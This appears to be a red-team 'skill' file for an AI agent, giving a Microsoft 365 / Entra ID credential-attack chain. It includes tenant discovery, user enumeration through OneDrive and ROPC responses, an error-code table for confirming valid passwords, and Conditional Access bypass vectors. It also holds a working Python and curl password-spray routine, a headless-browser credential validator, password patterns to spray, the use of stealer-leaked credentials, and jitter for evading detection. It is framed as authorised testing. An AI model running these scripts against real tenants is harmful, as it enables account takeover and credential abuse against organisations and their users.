---
name: Microsoft 365 / Entra ID Attack Chain
description: Credential attack, user enumeration, Smart Lockout math, and Conditional Access bypass against M365/Entra ID via ROPC, OneDrive enum, and SAML SSO — with deterministic AADSTS interpretation.
tags: [cloud, entra-id, m365, credential-spray, conditional-access, user-enumeration]
recommended_tools: [http_request, http_repeater, http_intruder, python3, curl, jq]
vuln_classes: []
domain: cloud
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/m365-entra-attack/SKILL.md]}
---

# Microsoft 365 / Entra ID Attack Chain

Credential-attack playbook for cloud-hosted Microsoft 365 / Entra ID tenants. Covers tenant
discovery, deterministic AADSTS interpretation, user enumeration, Smart Lockout accounting,
Conditional Access (CA) bypass exploration, ROPC + SAML validation, and active-attacker
detection as a byproduct.

## When to use

Use when:
- Target uses M365 / Entra ID: `login.microsoftonline.com` redirects, `autodiscover.*` records,
  `*.onmicrosoft.com`, `*-my.sharepoint.com`, `enterpriseregistration.*`, `enterpriseenrollment.*`
- You hold a list of corporate emails or stealer-leaked credentials
- Scope names "credential spray", "password spray", "Entra attack", "ATO via M365", "MFA bypass",
  "Conditional Access", or "compliant device"

Do NOT use for:
- On-prem-only Active Directory (different attack surface)
- Service-to-service / managed-identity token attacks (different threat model)
- Phishing-required chains — but the credential-validation step here can prep for them

## Tenant discovery

For each owned domain, resolve tenant metadata. Sister brands frequently have SEPARATE tenants,
each with its own user list, lockout policy, and CA config — test every owned domain.

```bash
msftrecon -d client.example
msftrecon -d clientltd.example
```

Read the raw openid-configuration and realm data yourself when a tool is unavailable:

```bash
curl -s "https://login.microsoftonline.com/client.example/.well-known/openid-configuration" | jq .
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@client.example&xml=1"
```

Key fields:
- **Tenant ID** — distinct domains may share or split tenants; always test all
- **NamespaceType** = `Managed` (cloud-only, ROPC works) | `Federated` (ADFS/Okta/Ping — pivot to
  the federated IdP; XSW / signature-stripping there bypasses Entra entirely)
- **SharePoint Detected** — Yes enables the OneDrive enumeration vector
- **Admin Consent Endpoint** — consent-phishing surface

## AADSTS code reference (memorize)

Microsoft returns the auth-stage error AFTER validating the password, so several error codes are
positive proof the credential is correct.

| AADSTS | Meaning | Lockout counter | Action |
|---|---|---|---|
| 50034 | User does not exist | none | remove from spray list |
| 50126 | Invalid username/password | +1 | user exists; wrong password |
| 50053 | Account locked (Smart Lockout) | none | pre-existing lock — flag, do not retry |
| 53003 | CA blocked token issuance | +1 | **PASSWORD VALID** — stop |
| 50076 | MFA required | +1 | **PASSWORD VALID** — second factor needed |
| 50079 | Strong auth required | +1 | **PASSWORD VALID** |
| 50158 | External auth required | +1 | **PASSWORD VALID** — federated MFA |
| 530003 | Device-state required | +1 | **PASSWORD VALID** — compliant device needed |
| 65001 | Consent required | +1 | app-consent issue, not auth |
| 700016 | App not in tenant | none | user in different tenant |
| 90002 | Tenant does not exist | none | tenant typo / dead tenant |

**Rule:** any of {53003, 50076, 50079, 50158, 530003} = the password is correct. Record it as a
confirmed-valid finding even when no token is obtained.

## Smart Lockout math (cap discipline)

Microsoft default: 10 failed sign-ins in 10 minutes → 1-minute lockout; 20+ → exponential backoff.
The failure counter is **shared across all auth flows** (ROPC + SAML + IMAP + EWS + SMTP + device-code).

Engagement discipline:
- Hard cap ≤ 2 password attempts per user, per lifetime of the engagement (often 1)
- State file with atomic writes; never let two runs race the counter
- Kill switch: pause if more than N LOCKED responses appear (pre-existing attacker or miscount)

**Guarantee:** with 1 attempt per user you cannot trigger Smart Lockout (1 < 10). Therefore any
AADSTS50053 you observe is pre-existing — a free active-attacker signal (see below).

## User enumeration

### Hardened — no longer differential (verify before use)
- `GET /getuserrealm.srf?login=<email>&xml=1` — tenant-level only, identical XML per domain
- `POST /common/GetCredentialType` — returns `AADSTS1659001` (missing flowToken) without a session
- `GET /autodiscover/autodiscover.json/v1.0/<email>?Protocol=AutodiscoverV1` — identical 200 body

### OneDrive personal-site differential (works as of mid-2026, track shelf life)

Zero authentication attempt → zero lockout impact.

```http
GET /personal/<user>_<domain>_com/_layouts/15/onedrive.aspx HTTP/1.1
Host: <tenant>-my.sharepoint.com
```

- **302 / 200 → user EXISTS** (auth-required redirect; licensed users return ~200 with a large body)
- **404, 0 bytes → user does NOT exist** or shared-mailbox / unlicensed account
- Secondary timing oracle: `Sprequestduration` header ~40ms for existing vs ~600ms for missing
- Requires SharePoint provisioned for the tenant; license-dependent false negatives possible
- The `/personal/<...>` root path (without `/_layouts/15/onedrive.aspx`) shows the same differential

### License differential = account-class signal

Cross-reference OneDrive existence with ROPC result to classify accounts:

| OneDrive | ROPC | Classification |
|---|---|---|
| 200 | 50076 / 50126 | Licensed regular user (MFA-enforced employee) |
| 404 | 50126 | **Shared / functional / service account** — often CA/MFA-exempt, prime target |
| 404 | 50034 | Does not exist |
| 404 | 50076 | Functional account WITH MFA (rare) |

The **OneDrive-404 + ROPC-50126** pair is the signal for "functional account that may bypass MFA" —
automation accounts (`noreply@`, `purchase@`, `accounts@`, `postmaster@`, `transport@`) are commonly
exempted from CA because they cannot satisfy interactive MFA.

### ROPC existence enum
50034 (no user, no counter) vs 50126 (wrong password, +1 counter) makes a 1-attempt spray double as
a coarse existence enumerator — each 50034 is a miss, each 50126 a hit with one attempt spent.

## Conditional Access bypass options (most blocked — document all)

| Vector | Status | Notes |
|---|---|---|
| Alternate ROPC client_id | Sometimes | CA can be per-app; try Graph PowerShell `1b730954-1685-4b74-9bfd-dac224a7b894`, Azure CLI `04b07795-8ddb-461a-bbee-02f9e1bf7b46`, Office `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Alternate resource | Sometimes | CA scope can be per-resource (graph.microsoft.com / outlook.office.com / management.azure.com) |
| EWS / IMAP / POP3 / SMTP Basic Auth | Mostly disabled | Basic Auth deprecated Oct 2022; per-account exceptions exist |
| FOCI (Family of Client IDs) | Refresh path | Refresh token from one FOCI client mints tokens for another |
| Device-code phishing | Works | Needs user interaction (often OOS) |
| Compliant-device emulation | Hard | Requires Intune registration |
| AiTM session-cookie steal | Works (phishing) | Modern primary technique; OOS for non-phishing |
| SAML SSO via weaker SP | Sometimes | Each enterprise app has its own CA policy; a weaker app is a pivot |
| Geo / trusted-location bypass | Sometimes | If CA trusts corp HQ IPs, use a VPN exit there |

**Reality check:** in tenants with a universal CA policy (compliant device + MFA), all paths return
AADSTS53003 with the same flow — the credential is valid but unusable externally. State that the
only realistic external adversary path is phishing-completed cookie theft so the client understands
the true blast radius.

## ROPC password validation (canonical single-attempt test)

```python
import urllib.request, urllib.parse, ssl, json, os
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
ATTEMPT_FILE = "engagement_log/o365_attempts.json"
HARD_CAP = 1  # or 2 — never higher

def attempt(email, password):
    state = json.load(open(ATTEMPT_FILE)) if os.path.exists(ATTEMPT_FILE) else {}
    if state.get(email.lower(), 0) >= HARD_CAP:
        return {"status": "SKIPPED_CAP"}
    body = urllib.parse.urlencode({
        "resource": "https://graph.windows.net",
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",  # Microsoft Graph PowerShell
        "client_info": "1",
        "grant_type": "password",
        "username": email,
        "password": password,
        "scope": "openid",
    }).encode()
    # burn the cap BEFORE sending — atomic write
    state[email.lower()] = state.get(email.lower(), 0) + 1
    json.dump(state, open(ATTEMPT_FILE + ".tmp", "w"))
    os.replace(ATTEMPT_FILE + ".tmp", ATTEMPT_FILE)
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token", data=body, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        parsed = json.loads(urllib.request.urlopen(req, context=ctx, timeout=15).read())
        if "access_token" in parsed:            # JSON KEY check — never substring (see trap)
            return {"status": "VALID", "body": parsed}
        return {"status": "STATUS_200_NO_TOKEN", "body": parsed}
    except urllib.error.HTTPError as e:
        msg = e.read().decode(errors="ignore")
        for code, status in [
            ("AADSTS50034", "INVALID_USER"), ("AADSTS50126", "INVALID_PW"),
            ("AADSTS50053", "LOCKED"), ("AADSTS53003", "VALID_CA_BLOCK"),
            ("AADSTS50076", "VALID_MFA"), ("AADSTS50079", "VALID_MFA"),
        ]:
            if code in msg:
                return {"status": status, "code": code}
        return {"status": "OTHER", "msg": msg[:200]}
```

Equivalent one-shot with `http_request` / curl:

```bash
curl -s https://login.microsoftonline.com/common/oauth2/token \
  -d resource=https://graph.windows.net \
  -d client_id=1b730954-1685-4b74-9bfd-dac224a7b894 \
  -d grant_type=password -d scope=openid \
  --data-urlencode username=user@client.example \
  --data-urlencode password='Guess@2026' | jq '.error_codes, .error_description'
```

### CRITICAL TRAP — AADSTS50076 body contains a literal `access_token` substring

When CA requires MFA, Entra returns a `claims` step-up challenge that embeds `access_token` inside
the CA policy JSON:

```json
{
  "error": "invalid_grant",
  "error_description": "AADSTS50076: ...multi-factor authentication...",
  "error_codes": [50076],
  "suberror": "basic_action",
  "claims": "{\"access_token\":{\"capolids\":{\"essential\":true,\"values\":[\"<policy-id>\"]}}}"
}
```

A loose `if "access_token" in raw_body:` check FALSE-POSITIVES every MFA-blocked attempt as a token
issuance. Always parse JSON first, then check `if "access_token" in parsed_dict:`. The
`claims.access_token.capolids` values are tenant-internal CA policy IDs — useful recon enrichment,
NOT a token; log them as "CA policy IDs that fired".

Pace: ≤ 30 req/sec per IP is tolerated; the per-user state-file cap is the only thing that protects
users. Add 1–5s jitter for a less machine-like signature.

## SAML SSO browser validation (definitive proof when CA blocks ROPC)

When ROPC returns AADSTS53003 you have already proven the password. To prove it across both auth
paths and capture Microsoft's CA-block page as evidence, drive SAML SSO with a headless browser.

```python
import asyncio
from playwright.async_api import async_playwright

async def saml_validate(target_sp_url, username, password, screenshot_dir):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--ignore-certificate-errors"])
        context = await browser.new_context(ignore_https_errors=True)
        page = await context.new_page()
        await page.goto(target_sp_url, wait_until="networkidle", timeout=30000)
        for sel in ["button:has-text('Sign in')", "a:has-text('Login')", "button:has-text('Azure')"]:
            try:
                await page.locator(sel).first.click(timeout=3000); break
            except Exception: continue
        await page.wait_for_load_state("networkidle", timeout=20000)
        await page.locator('input[name="loginfmt"], input[type="email"]').first.fill(username)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=20000)
        await page.locator('input[name="passwd"], input[type="password"]').first.fill(password)
        await page.locator('input[type="submit"], #idSIButton9').first.click()
        await page.wait_for_load_state("networkidle", timeout=30000)
        await page.screenshot(path=f"{screenshot_dir}/saml_final.png", full_page=True)
        low = (await page.content()).lower()
        await browser.close()
        if "convergedconditionalaccess" in low or "53003" in low: return "CA_BLOCKED"
        if "verify your identity" in low or "approve sign in" in low: return "MFA_REQUIRED"
        if "we couldn't sign you in" in low or "wrong" in low: return "INVALID"
        if "dashboard" in low: return "FULL_SUCCESS"  # replace marker per target app
        return "UNCLEAR"
```

Microsoft's `ConvergedConditionalAccess` page is the definitive evidence of a CA block.

## Active-attacker detection via lockout differential

If AADSTS50053 (LOCKED) appears on multiple users despite a 1-attempt-per-user cap:
1. You did not cause the locks (1 < 10).
2. An external attacker is actively spraying the tenant.
3. Cluster the locked users alphabetically — clustering implies a sorted username list.
4. Diff the locked set at spray-start vs spray-end — new locks during your session = live attacker.
5. Deliver the locked-email list as a SOC-actionable finding (they pull sign-in logs).

This is often the highest-impact byproduct of an M365 spray engagement. Always track and report it.

## Password patterns to spray (multi-brand enterprise)

- `<Brand>@<Year>`, `<Brand>@<Y2>` — `Acme@2026`, `Acme@26`
- `<Brand>@123` (very common)
- `<PlantCity>@<Year>` — production-plant city names
- `<EmployeeID>` / national-ID / phone last4 as password (legacy apps)
- `Password@<year>`, `Welcome@<year>`, `Admin@<year>`

When the client supplies stealer-log dumps, use those FIRST — each leaked cred is one cap-attempt
against the strongest known guess for that user.

## Evidence & journaling (mandatory)

JSONL result log, atomic per-user tracker, and IP-rotation log are the deliverable evidence:

```json
{"ts":"2026-05-08T14:40:53","email":"user@client.example","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
```

Report findings with explicit blast radius, e.g.:
- **N Entra accounts in pre-existing lockout** — active external spray campaign; evidence = results
  filtered to `status=LOCKED`; math shows it is not your doing; SOC pulls 30–60 days of sign-in logs.
- **Valid CA-blocked credential** `<user>:<password>` — evidence = ROPC AADSTS53003 + SAML
  `ConvergedConditionalAccess` screenshot; recommend forced reset and org-wide pattern audit.

## Anti-patterns

- Do NOT reuse a leaked cred across multiple resources when CA blocks all paths — it burns the cap
  for no marginal gain.
- Do NOT retry after AADSTS50053 — the account is locked.
- Do NOT exceed ~30 req/sec to `login.microsoftonline.com` — sustained rate flags the IP.
- Do NOT skip sister-domain tenants — separate tenants often have different policies.
- Do NOT retract a CA-block finding — AADSTS53003 means the password is correct.

## Chaining

- Federated realm (`NamespaceType: Federated`, AuthURL → `*.okta.com` / ADFS) → pivot to the IdP;
  SAML XSW / signature-stripping there bypasses Entra controls entirely.
- On-prem NTLM Type-2 leak (SharePoint/Exchange/IIS anon) → AV_PAIR decode yields the AD domain →
  resolve Entra tenant → ROPC spray with realistic UPN format.
- AADSTS50053 lockout differential = a factor-presence oracle → probe legacy-auth / device-code MFA
  fallbacks for a Conditional Access bypass.
